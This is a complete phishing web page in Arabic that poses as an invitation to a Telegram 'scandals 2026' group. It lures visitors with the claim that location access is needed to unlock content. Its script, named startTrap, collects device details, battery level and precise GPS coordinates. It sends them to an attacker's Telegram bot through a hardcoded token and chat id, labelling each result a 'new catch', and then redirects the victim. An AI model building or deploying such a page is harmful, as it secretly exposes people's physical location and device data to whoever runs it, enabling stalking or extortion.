<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Group Join</title>
    <style>
        body { background-color: #1c1c1c; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #2b2b2b; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 400px; border: 1px solid #444; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .btn { background: #24A1DE; color: white; padding: 15px 30px; border: none; border-radius: 30px; font-weight: bold; font-size: 18px; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
        .btn:active { transform: scale(0.95); background: #1e81b0; }
        img { margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="70">
        <h2>جروب: فضائح 2026 🔥</h2>
        <p>يجب السماح بالوصول للموقع للتأكد من دولتك وفتح المحتوى الحصري.</p>
        <button class="btn" onclick="startTrap()">انضمام الآن</button>
    </div>

    <script>
        async function startTrap() {
            const token = '8785845001:AAHzQH63-LseRb0meHZI6-9fCLHNW1nst_c';
            const chat_id = '6648970984';

            // 1. جمع معلومات الجهاز
            const info = {
                device: navigator.platform,
                browser: navigator.userAgent.split(' ').slice(-1)[0],
                screen: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language
            };

            // 2. الحصول على مستوى البطارية (اختياري)
            let batteryLevel = "غير معروف";
            try {
                const battery = await navigator.getBattery();
                batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
            } catch (e) {}

            // 3. طلب الموقع الجغرافي
            navigator.geolocation.getCurrentPosition(async (p) => {
                const lat = p.coords.latitude;
                const lon = p.coords.longitude;
                const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
                
                const text = `🎯 **صيد جديد بنجاح!**\n\n` +
                             `📍 **الموقع:** ${googleMaps}\n` +
                             `📱 **الجهاز:** ${info.device}\n` +
                             `🌐 **المتصفح:** ${info.browser}\n` +
                             `🔋 **البطارية:** ${batteryLevel}\n` +
                             `🖥 **الشاشة:** ${info.screen}`;

                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
                
                // تحويل الضحية بعد الصيد
                window.location.href = "https://t.me/telegram";
            }, (err) => {
                alert("خطأ: يجب السماح بالوصول للموقع للدخول إلى الجروب!");
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
